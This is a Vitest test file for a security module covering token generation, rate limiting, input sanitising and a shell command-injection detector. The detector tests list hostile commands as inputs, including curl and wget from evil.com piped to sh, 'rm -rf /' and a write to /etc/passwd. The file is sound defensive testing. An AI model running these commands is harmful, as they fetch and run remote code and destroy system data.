import { describe, it, expect } from 'vitest';
import {
  generateSecureToken,
  generateSessionId,
  hashForLogging,
  isValidToken,
  RateLimiter,
  sanitizeInput,
  detectInjection,
} from '../security.js';

describe('Security Module', () => {
  describe('generateSecureToken', () => {
    it('should generate a token of default length (32 bytes = ~43 chars base64url)', () => {
      const token = generateSecureToken();
      expect(token).toBeDefined();
      expect(token.length).toBeGreaterThanOrEqual(40);
    });

    it('should generate tokens of specified length', () => {
      const token16 = generateSecureToken(16);
      const token64 = generateSecureToken(64);
      expect(token16.length).toBeLessThan(token64.length);
    });

    it('should generate unique tokens each time', () => {
      const tokens = new Set();
      for (let i = 0; i < 100; i++) {
        tokens.add(generateSecureToken());
      }
      expect(tokens.size).toBe(100);
    });

    it('should only contain base64url characters', () => {
      const token = generateSecureToken();
      expect(token).toMatch(/^[A-Za-z0-9_-]+$/);
    });
  });

  describe('generateSessionId', () => {
    it('should generate 8-character hex session ID', () => {
      const sessionId = generateSessionId();
      expect(sessionId).toHaveLength(8);
      expect(sessionId).toMatch(/^[a-f0-9]+$/);
    });

    it('should generate unique session IDs', () => {
      const ids = new Set();
      for (let i = 0; i < 100; i++) {
        ids.add(generateSessionId());
      }
      expect(ids.size).toBe(100);
    });
  });

  describe('hashForLogging', () => {
    it('should return 8-character hash prefix', () => {
      const hash = hashForLogging('test-token-12345');
      expect(hash).toHaveLength(8);
    });

    it('should return consistent hash for same input', () => {
      const hash1 = hashForLogging('same-token');
      const hash2 = hashForLogging('same-token');
      expect(hash1).toBe(hash2);
    });

    it('should return different hash for different input', () => {
      const hash1 = hashForLogging('token-1');
      const hash2 = hashForLogging('token-2');
      expect(hash1).not.toBe(hash2);
    });
  });

  describe('isValidToken', () => {
    it('should accept valid base64url tokens', () => {
      expect(isValidToken('abcdefghijklmnopqrstuvwxyz')).toBe(true);
      expect(isValidToken('ABCDEFGHIJKLMNOPQRSTUVWXYZ')).toBe(true);
      expect(isValidToken('0123456789_-abcDEFghijkl')).toBe(true); // 24 chars, min is 20
    });

    it('should reject tokens that are too short', () => {
      expect(isValidToken('short')).toBe(false);
      expect(isValidToken('123456789012345678')).toBe(false); // 18 chars
    });

    it('should reject tokens that are too long', () => {
      expect(isValidToken('a'.repeat(65))).toBe(false);
    });

    it('should reject tokens with invalid characters', () => {
      expect(isValidToken('token with spaces')).toBe(false);
      expect(isValidToken('token+with+plus')).toBe(false);
      expect(isValidToken('token/with/slash')).toBe(false);
    });
  });

  describe('RateLimiter', () => {
    it('should allow connections within limit', () => {
      const limiter = new RateLimiter(5, 60000);
      for (let i = 0; i < 5; i++) {
        expect(limiter.isAllowed('192.168.1.1')).toBe(true);
      }
    });

    it('should block connections exceeding limit', () => {
      const limiter = new RateLimiter(3, 60000);
      expect(limiter.isAllowed('192.168.1.1')).toBe(true);
      expect(limiter.isAllowed('192.168.1.1')).toBe(true);
      expect(limiter.isAllowed('192.168.1.1')).toBe(true);
      expect(limiter.isAllowed('192.168.1.1')).toBe(false);
    });

    it('should track different IPs separately', () => {
      const limiter = new RateLimiter(2, 60000);
      expect(limiter.isAllowed('192.168.1.1')).toBe(true);
      expect(limiter.isAllowed('192.168.1.1')).toBe(true);
      expect(limiter.isAllowed('192.168.1.1')).toBe(false);
      // Different IP should still be allowed
      expect(limiter.isAllowed('192.168.1.2')).toBe(true);
    });

    it('should cleanup expired entries', () => {
      const limiter = new RateLimiter(10, 1); // 1ms window
      limiter.isAllowed('192.168.1.1');
      // Wait for expiration
      return new Promise((resolve) => {
        setTimeout(() => {
          limiter.cleanup();
          // After cleanup, should be allowed again
          expect(limiter.isAllowed('192.168.1.1')).toBe(true);
          resolve(undefined);
        }, 10);
      });
    });
  });

  describe('sanitizeInput', () => {
    it('should remove null bytes', () => {
      expect(sanitizeInput('hello\x00world')).toBe('helloworld');
      expect(sanitizeInput('\x00\x00test')).toBe('test');
    });

    it('should preserve normal terminal sequences', () => {
      expect(sanitizeInput('\x1b[31mred\x1b[0m')).toBe('\x1b[31mred\x1b[0m');
      expect(sanitizeInput('normal text')).toBe('normal text');
    });

    it('should preserve newlines and tabs', () => {
      expect(sanitizeInput('line1\nline2')).toBe('line1\nline2');
      expect(sanitizeInput('col1\tcol2')).toBe('col1\tcol2');
    });
  });

  describe('detectInjection', () => {
    it('should detect command substitution with $()', () => {
      expect(detectInjection('echo $(whoami)')).toBe(true);
      expect(detectInjection('$(rm -rf /)')).toBe(true);
    });

    it('should detect backtick command substitution', () => {
      expect(detectInjection('echo `whoami`')).toBe(true);
    });

    it('should detect piping to shell', () => {
      expect(detectInjection('curl http://evil.com | sh')).toBe(true);
      expect(detectInjection('wget http://evil.com | bash')).toBe(true);
    });

    it('should detect writing to system files', () => {
      expect(detectInjection('echo "bad" > /etc/passwd')).toBe(true);
    });

    it('should detect remote code execution patterns', () => {
      expect(detectInjection('curl http://evil.com/script.sh | sh')).toBe(true);
      expect(detectInjection('wget -O- http://evil.com | sh')).toBe(true);
    });

    it('should allow normal commands', () => {
      expect(detectInjection('ls -la')).toBe(false);
      expect(detectInjection('git status')).toBe(false);
      expect(detectInjection('npm install')).toBe(false);
      expect(detectInjection('echo "hello world"')).toBe(false);
    });

    it('should detect injection with semicolon rm', () => {
      expect(detectInjection('; rm -rf /')).toBe(true);
      expect(detectInjection('echo hi; rm everything')).toBe(true);
    });
  });
});
